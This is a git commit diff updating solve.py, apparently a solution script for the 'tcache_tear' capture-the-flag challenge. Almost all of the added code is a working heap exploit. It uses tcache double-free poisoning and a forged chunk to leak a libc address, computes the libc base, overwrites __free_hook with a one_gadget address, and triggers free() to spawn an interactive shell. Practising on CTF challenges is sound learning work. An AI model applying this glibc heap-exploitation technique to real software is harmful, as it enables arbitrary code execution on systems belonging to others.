0423db0c7c7ef38238d989d3e29ebbf712997fe6
tuancvp125 <57163498+tuancvp125@users.noreply.github.com>
2024-07-25 19:07:54 +0700

    Update solve.py

--- pwnable/tcache_tear/solve.py
+++ pwnable/tcache_tear/solve.py
@@ -43,17 +43,47 @@ def free():
 
 def info():
     sla(b'Your choice :', b'3')
-    leak = rl
-    return leak
+    leak = conn.recvline()
+    return leak[6:]
 
 conn = start()
 
-nameBuf(b'tuan')
-add_buf = 0x602060
-malloc(31, p64(add_buf))
+nameBuf(p64(0x602450))
+add = 0x602550
+malloc(0x90, p64(add))
 free()
 free()
-malloc(31, p64(add_buf))
+malloc(0x90, p64(add))
+malloc(0x90, b'A' * 4) #original
+malloc(0x90, p64(0) + p64(0x41) + b'A' * 0x30 + p64(0) + p64(0x21))
+
+malloc(0xf0, b'A' * 4)
+free()
+free()
+malloc(0xf0, p64(0x602050))
+malloc(0xf0, b'A' * 4)
+malloc(0xf0, p64(0) + p64(0x501) + b'B'* 0x28 + p64(0x602060))
+free()
+
+leak = info()
+print(leak)
+libc = u64(leak[0:8].ljust(8, b'\x00'))
+print(hex(libc))
+
+offset_leak = 0x3ebca0
+libc = libc - offset_leak
+print(hex(libc))
+
+free_hook = libc + 0x0000000003ed8e8
+one_gadget = libc + 0x4f322
+
+malloc(0x60, b'A' * 4)
+free()
+free()
+malloc(0x60, p64(free_hook))
+malloc(0x60, p64(free_hook))
+malloc(0x60, p64(one_gadget))
+
+free()
 
 conn.interactive()
-
